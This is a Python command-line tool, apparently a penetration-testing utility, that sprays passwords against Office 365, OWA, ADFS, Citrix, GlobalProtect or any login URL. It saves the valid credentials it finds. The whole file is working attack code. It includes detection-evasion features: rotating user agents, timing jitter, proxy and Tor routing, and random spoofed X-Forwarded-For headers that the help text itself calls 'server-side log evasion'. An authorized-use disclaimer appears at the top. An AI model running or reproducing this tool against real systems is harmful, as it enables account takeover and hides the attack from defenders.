#!/usr/bin/env python3
"""
Credential spray orchestrator.

For authorized use on systems you own or have explicit written permission to test.
Unauthorized use against systems you do not own is illegal.
"""
import argparse
import json
import random
import signal
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import requests

from targets import adfs, citrix, globalprotect, o365, owa

def _random_public_ipv4() -> str:
    """
    Generate a random public-ish IPv4 string for X-Forwarded-For rotation.

    Avoids RFC1918 ranges, loopback, multicast, and the canonical reserved
    blocks. Targets often allow internal IPs through additional filters, so we
    deliberately stay public-routable.
    """
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        if a in (10, 127):
            continue
        if a == 172 and 16 <= b <= 31:
            continue
        if a == 192 and b == 168:
            continue
        if a == 169 and b == 254:
            continue
        if a >= 224:  # multicast / reserved
            continue
        return f"{a}.{b}.{c}.{d}"


# Built-in user-agent pool for rotation (real browsers, recent versions).
_DEFAULT_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
]


def _now() -> str:
    return datetime.now().strftime("%H:%M:%S")


def _iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _load_lines(path: str) -> list[str]:
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def _load_state(state_file: Path) -> set[str]:
    try:
        data = json.loads(state_file.read_text())
        return set(data.get("attempted", []))
    except FileNotFoundError:
        return set()


def _save_state(state_file: Path, attempted: set[str]) -> None:
    state_file.write_text(json.dumps({"attempted": list(attempted)}))


def _log_attempt(log_file: Path, username: str, password: str, status: str, notes: str, extra: dict | None = None) -> None:
    entry = {
        "timestamp": _iso_now(),
        "username": username,
        "password": password,
        "status": status,
        "notes": notes,
    }
    if extra:
        entry.update(extra)
    with log_file.open("a") as f:
        f.write(json.dumps(entry) + "\n")


def _write_valid(output_file: Path, username: str, password: str) -> None:
    with output_file.open("a") as f:
        f.write(f"{username}:{password}\n")


def _attempt_generic(
    username: str,
    password: str,
    url: str,
    success_code: int,
    proxies: dict | None,
    headers: dict | None,
    verify: bool,
) -> dict:
    try:
        r = requests.post(
            url,
            data={"username": username, "password": password},
            allow_redirects=False,
            timeout=15,
            proxies=proxies,
            headers=headers,
            verify=verify,
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    if r.status_code == success_code:
        return {"success": True, "locked": False, "notes": "valid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}


def _build_pairs(userlist: list[str], passwords: list[str]) -> list[tuple[str, str]]:
    pairs = []
    for password in passwords:
        for username in userlist:
            pairs.append((username, password))
    return pairs


def _build_proxies(arg: str | None) -> dict | None:
    if not arg:
        return None
    return {"http": arg, "https": arg}


def _build_ua_pool(arg: str | None) -> list[str]:
    if not arg:
        return list(_DEFAULT_UA_POOL)
    p = Path(arg)
    if p.exists():
        loaded = _load_lines(str(p))
        return loaded or list(_DEFAULT_UA_POOL)
    return [arg]


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Credential spray orchestrator. "
            "For authorized use on systems you own or have explicit written permission to test."
        )
    )
    parser.add_argument("--userlist", required=True, help="Path to username list (one per line)")
    parser.add_argument("--password", help="Single password to spray")
    parser.add_argument("--passlist", help="Path to password list (one per line)")
    parser.add_argument(
        "--target",
        required=True,
        help=(
            "Target type. Built-ins: 'o365', 'owa', 'adfs', 'citrix', 'globalprotect'. "
            "Or a generic URL (https://...)."
        ),
    )
    parser.add_argument("--owa-url", help="Base OWA URL (required when --target owa)")
    parser.add_argument("--adfs-url", help="Base ADFS URL (required when --target adfs)")
    parser.add_argument("--citrix-url", help="Base Citrix StoreFront URL (required when --target citrix)")
    parser.add_argument("--gp-url", help="Base GlobalProtect portal URL (required when --target globalprotect)")
    parser.add_argument(
        "--output", default="valid_creds.txt", help="File to write valid credentials (default: valid_creds.txt)"
    )
    parser.add_argument(
        "--lockout-threshold",
        type=int,
        default=3,
        help="Skip account after this many lockout responses (default: 3)",
    )
    parser.add_argument(
        "--delay", type=float, default=1.5, help="Base delay in seconds between attempts (default: 1.5)"
    )
    parser.add_argument(
        "--jitter", type=float, default=1.0, help="Max random jitter added to delay in seconds (default: 1.0)"
    )
    parser.add_argument(
        "--success-code",
        type=int,
        default=302,
        help="HTTP status code indicating success for generic URL target (default: 302)",
    )
    parser.add_argument(
        "--resume",
        action="store_true",
        help="Resume from .spray_state.json, skipping already-attempted pairs",
    )
    parser.add_argument(
        "--proxy",
        help="HTTP(S) proxy URL (e.g. http://127.0.0.1:8080 or socks5h://127.0.0.1:9050). Applies to all requests.",
    )
    parser.add_argument(
        "--user-agents",
        help=(
            "User-agent rotation source. Either a path to a file (one UA per line) or a single UA string. "
            "When omitted, a built-in pool of recent browser UAs is used."
        ),
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="Disable TLS certificate verification (use only against trusted lab targets).",
    )
    parser.add_argument(
        "--engagement-id",
        help="Engagement identifier — recorded in every log entry for client reporting.",
    )
    parser.add_argument(
        "--max-attempts",
        type=int,
        default=0,
        help="Hard cap on total attempts in this run (0 = unlimited). Useful for time-boxed engagements.",
    )
    parser.add_argument(
        "--xff-rotate",
        action="store_true",
        help="Add a random public IPv4 X-Forwarded-For header on every request (server-side log evasion).",
    )
    parser.add_argument(
        "--header",
        action="append",
        default=[],
        metavar="KEY:VALUE",
        help="Custom header to send on every request. Repeatable. Example: --header 'X-Forwarded-Host: legit.com'.",
    )
    args = parser.parse_args()

    if not args.password and not args.passlist:
        parser.error("One of --password or --passlist is required.")

    target_requirements = {
        "owa": ("--owa-url", args.owa_url),
        "adfs": ("--adfs-url", args.adfs_url),
        "citrix": ("--citrix-url", args.citrix_url),
        "globalprotect": ("--gp-url", args.gp_url),
    }
    if args.target in target_requirements:
        flag, value = target_requirements[args.target]
        if not value:
            parser.error(f"{flag} is required when --target is '{args.target}'.")

    userlist = _load_lines(args.userlist)
    if args.passlist:
        passwords = _load_lines(args.passlist)
    else:
        passwords = [args.password]

    output_file = Path(args.output)
    log_file = output_file.parent / ".spray_log.jsonl"
    state_file = output_file.parent / ".spray_state.json"

    attempted: set[str] = _load_state(state_file) if args.resume else set()
    proxies = _build_proxies(args.proxy)
    ua_pool = _build_ua_pool(args.user_agents)
    verify_tls = not args.insecure
    log_extra = {"engagement_id": args.engagement_id} if args.engagement_id else None

    pairs = _build_pairs(userlist, passwords)
    lockout_counts: dict[str, int] = {}

    valid_count = 0
    skipped = 0
    total_attempts = 0

    print(
        f"[{_now()}] Starting spray: {len(userlist)} users x {len(passwords)} passwords = {len(pairs)} pairs",
        file=sys.stderr,
    )
    if args.resume and attempted:
        print(f"[{_now()}] Resuming: {len(attempted)} pairs already attempted", file=sys.stderr)
    if proxies:
        print(f"[{_now()}] Using proxy: {args.proxy}", file=sys.stderr)
    if args.engagement_id:
        print(f"[{_now()}] Engagement ID: {args.engagement_id}", file=sys.stderr)

    # Ensure state is persisted on Ctrl+C or kill.
    def _on_signal(signum, _frame):
        _save_state(state_file, attempted)
        print(f"\n[{_now()}] Signal {signum} — state saved, exiting.", file=sys.stderr)
        sys.exit(130)

    signal.signal(signal.SIGINT, _on_signal)
    signal.signal(signal.SIGTERM, _on_signal)

    try:
        for username, password in pairs:
            pair_key = f"{username}:{password}"

            if pair_key in attempted:
                skipped += 1
                continue

            if lockout_counts.get(username, 0) >= args.lockout_threshold:
                continue

            if args.max_attempts and total_attempts >= args.max_attempts:
                print(f"[{_now()}] Max attempts ({args.max_attempts}) reached. Exiting.", file=sys.stderr)
                break

            sleep_time = args.delay + random.uniform(0, args.jitter)
            time.sleep(sleep_time)

            headers: dict = {"User-Agent": random.choice(ua_pool)} if ua_pool else {}
            if args.xff_rotate:
                headers["X-Forwarded-For"] = _random_public_ipv4()
            for h in args.header:
                if ":" in h:
                    k, v = h.split(":", 1)
                    headers[k.strip()] = v.strip()
            if not headers:
                headers = None

            if args.target == "o365":
                result = o365.attempt(username, password, proxies=proxies)
            elif args.target == "owa":
                result = owa.attempt(
                    username, password, args.owa_url,
                    proxies=proxies, headers=headers, verify=verify_tls,
                )
            elif args.target == "adfs":
                result = adfs.attempt(
                    username, password, args.adfs_url,
                    proxies=proxies, headers=headers, verify=verify_tls,
                )
            elif args.target == "citrix":
                result = citrix.attempt(
                    username, password, args.citrix_url,
                    proxies=proxies, headers=headers, verify=verify_tls,
                )
            elif args.target == "globalprotect":
                result = globalprotect.attempt(
                    username, password, args.gp_url,
                    proxies=proxies, headers=headers, verify=verify_tls,
                )
            else:
                result = _attempt_generic(
                    username, password, args.target, args.success_code,
                    proxies=proxies, headers=headers, verify=verify_tls,
                )

            total_attempts += 1

            if result["notes"] == "rate_limited":
                pause = args.delay * 5
                print(f"[{_now()}] WARNING: rate limited — pausing {pause:.1f}s", file=sys.stderr)
                time.sleep(pause)
                result = {"success": False, "locked": False, "notes": "rate_limited_skipped"}

            status = "VALID" if result["success"] else ("LOCKED" if result["locked"] else "INVALID")
            print(f"[{_now()}] {username}:{password} → {status} | {result['notes']}", file=sys.stderr)

            _log_attempt(log_file, username, password, status, result["notes"], extra=log_extra)
            attempted.add(pair_key)
            if len(attempted) % 50 == 0:
                _save_state(state_file, attempted)

            if result["success"]:
                valid_count += 1
                _write_valid(output_file, username, password)

            if result["locked"]:
                lockout_counts[username] = lockout_counts.get(username, 0) + 1
                if lockout_counts[username] >= args.lockout_threshold:
                    print(f"[{_now()}] Skipping {username} — lockout threshold reached", file=sys.stderr)

            locked_out_count = sum(1 for c in lockout_counts.values() if c >= args.lockout_threshold)
            if locked_out_count == len(userlist):
                print(f"[{_now()}] All accounts hit lockout threshold. Exiting.", file=sys.stderr)
                break

    finally:
        _save_state(state_file, attempted)

    locked_out_total = sum(1 for c in lockout_counts.values() if c >= args.lockout_threshold)
    print(
        f"[{_now()}] Done. Valid: {valid_count} | Locked out: {locked_out_total} | Skipped (resume): {skipped} | Attempts: {total_attempts}",
        file=sys.stderr,
    )
    print(f"[{_now()}] Valid creds written to: {output_file}", file=sys.stderr)
    print(f"[{_now()}] Full log written to: {log_file}", file=sys.stderr)


if __name__ == "__main__":
    main()
